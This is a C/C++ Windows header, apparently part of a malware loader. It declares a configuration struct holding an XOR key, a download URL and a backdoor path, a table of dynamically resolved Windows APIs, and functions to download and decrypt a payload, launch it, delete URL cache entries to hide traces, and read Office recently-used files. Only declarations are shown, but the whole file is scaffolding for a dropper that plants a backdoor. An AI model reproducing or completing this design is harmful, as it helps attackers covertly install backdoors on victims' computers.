#include <Windows.h>
#ifndef __loader_h
#define __loader_h

//#pragma optimize("", off)
#include "winapi.h"

#define FAST_KERNEL32_HANDLE
#define FAST_POINTERS

struct __config {
	DWORD dwXorKey;
	char szUrl[132];
	char szBackdoorPath[52];
};
struct __strings
{
//	DWORD ShellcodeGadget1;
//	DWORD ShellcodeGadget2;
//	DWORD ShellcodeGadget3;
	CHAR strNtDll[6];
	CHAR strKernel32[9];
	CHAR strUser32[7];
	CHAR strShell32[8];
	CHAR strUrlMon[7];
	CHAR strWinInet[8];
	CHAR strAdvapi32[9];
	
	CHAR strVirtualAlloc[13];
	CHAR strGetFileSize[12];
	CHAR strSleep[6];
	CHAR strExitProcess[12];
	CHAR strGetModuleFileNameW[19];
	CHAR strZwQueryInformationFile[23];
	CHAR strShellExecuteW[14];
	CHAR strUrlDownloadToFileA[19];
	CHAR strSHGetSpecialFolderPathW[24];
	CHAR strFindFirstUrlCacheEntryA[24];
	CHAR strFindNextUrlCacheEntryA[23];
	CHAR strDeleteUrlCacheEntryA[21];
	CHAR strFindCloseUrlCache[18];
	CHAR strNtQueryObject[14];
	CHAR strCloseHandle[12];
	CHAR strGetShortPathNameW[18];
	CHAR strGetFileAttributesW[19];
	CHAR strRegOpenKeyExW[14];
	CHAR strRegQueryValueExW[17];
	CHAR strDeleteFileA[12];
	CHAR strGetUrlCacheEntryInfoA[22];
	CHAR strInternetOpenA[14];
	CHAR strInternetOpenUrlA[17];
	CHAR strHttpQueryInfoA[15];
	CHAR strInternetReadFileExA[20];
	CHAR strCreateFileA[12];
	CHAR strWriteFile[10];
	CHAR strAtoi[5];
	CHAR strWcsToMbs[9];


	WCHAR strOfficeKey1[27];
	WCHAR strWord[5];
	WCHAR strPowerPoint[11];
	WCHAR strOfficeKey2[15];
	WCHAR strOfficeItem[7];

	CHAR strSWFSuffix[5];

	WCHAR strDOCRunning[13];
	WCHAR strDOCRunning2[6];
	WCHAR strPPRunning1[5];
	WCHAR strPPRunning2[8];


	WCHAR strDOCX[6];
	WCHAR strPPSX[6];

	WCHAR strDOCArgs[8];
	WCHAR strPPTArgs[5];

	WCHAR strTmp[4];
	WCHAR strQuote[2];

	CHAR strUserAgent[187];
};
typedef struct _VTABLE
{
	GETPROCADDRESS GetProcAddress;
	LOADLIBRARYA LoadLibraryA;
	OUTPUTDEBUGSTRINGA OutputDebugStringA;
	GETFILESIZE GetFileSize;
	VIRTUALALLOC VirtualAlloc;
	CLOSEHANDLE CloseHandle;
	SLEEP Sleep;
	EXITPROCESS ExitProcess;
	SHELLEXECUTEW ShellExecuteW;
	GETSHORTPATHNAMEW GetShortPathNameW;
	GETMODULEFILENAMEW GetModuleFileNameW;
	NTQUERYINFORMATIONFILE NtQueryInformationFile;
	NTQUERYOBJECT NtQueryObject;
	FINDFIRSTURLCACHEENTRYA FindFirstUrlCacheEntryA;
	FINDNEXTURLCACHEENTRYA FindNextUrlCacheEntryA;
	DELETEURLCACHEENTRYA DeleteUrlCacheEntryA;
	FINDCLOSEURLCACHE FindCloseUrlCache;
	URLDOWNLOADTOFILEA URLDownloadToFileA;
	SHGETSPECIALFOLDERPATHW SHGetSpecialFolderPathW;
	GETSHORTPATHNAMEA GetShortPathNameA;
	GETFILEATTRIBUTESW GetFileAttributesW;
	REGOPENKEYEXW RegOpenKeyExA;
	REGQUERYVALUEEXW RegQueryValueExA;
	DELETEFILEA DeleteFileA;
	GETURLCACHEENTRYINFOA GetUrlCacheEntryInfoA;
	INTERNETOPENA InternetOpenA;
	INTERNETOPENURLA InternetOpenUrlA;
	HTTPQUERYINFOA HttpQueryInfoA;
	INTERNETREADFILEEXA InternetReadFileExA;
	CREATEFILEA CreateFileA;
	WRITEFILE WriteFile;
	ATOI atoi;
	WCSTOMBS wcstombs;
} VTABLE, *PVTABLE;

extern "C" VOID Startup();
extern "C" VOID LoaderEntryPoint(struct __vtbl *VTBL, struct __config *config, struct __strings *strings);
extern "C" BOOL GetVTable(__out PVTABLE lpTable, struct __strings *strings);
extern "C" BOOL GetPointers(__out PGETPROCADDRESS fpGetProcAddress, __out PLOADLIBRARYA fpLoadLibraryA);
extern "C" HANDLE GetKernel32Handle();
extern "C" VOID RemoveCachedObject(__in PVTABLE lpTable, __in LPSTR strUrl, __in BOOL isSubString);
#ifdef FAST_POINTERS
extern "C" DWORD GetStringHash(__in LPVOID lpBuffer, __in BOOL bUnicode, __in UINT uLen);
#endif
extern "C" LPWSTR FindDriveOfFile(__in PVTABLE lpTable, __in struct __strings *strings, __in LPWSTR strFileName);
extern "C" LPWSTR ReadMRU(__in PVTABLE lpTable, __in struct __strings *strings);
extern "C" LPBYTE Decrypt(__in LPBYTE lpBuffer, __in DWORD dwBuffLen, __in DWORD dwXorKey);
extern "C" LPBYTE DownloadAndDecrypt(__in PVTABLE lpTable, __in struct __strings *strings, __in LPSTR strUrl, __in LPDWORD dwFileLen, __in DWORD dwXorKey);
extern "C" BOOL DownloadFile(__in PVTABLE lpTable, __in HINTERNET hUrl, __in LPBYTE lpBuffer, __in DWORD dwBufferLen);
// crt
extern "C" BOOL __ISUPPER__(__in CHAR c);
extern "C" CHAR __TOLOWER__(__in CHAR c);
extern "C" UINT __STRLEN__(__in LPSTR lpStr1);
extern "C" UINT __STRLENW__(__in LPWSTR lpStr1);
extern "C" INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
extern "C" LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);
extern "C" INT __STRNCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2, __in DWORD dwLen);
extern "C" INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2,__in DWORD dwLen);
extern "C" LPWSTR __STRCATW__(__in LPWSTR	strDest, __in LPWSTR strSource);
extern "C" LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);
extern "C" VOID __MEMSET__(__in LPVOID p, __in CHAR cValue, __in DWORD dwSize);
extern "C" LPSTR __STRSTRI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
extern "C" LPSTR __STRCAT__(__in LPSTR	strDest, __in LPSTR strSource);
extern "C" VOID END_LOADER_DATA();

// OPTIONS -> linker -> function order

//#pragma optimize("", on)
#endif //__loader_h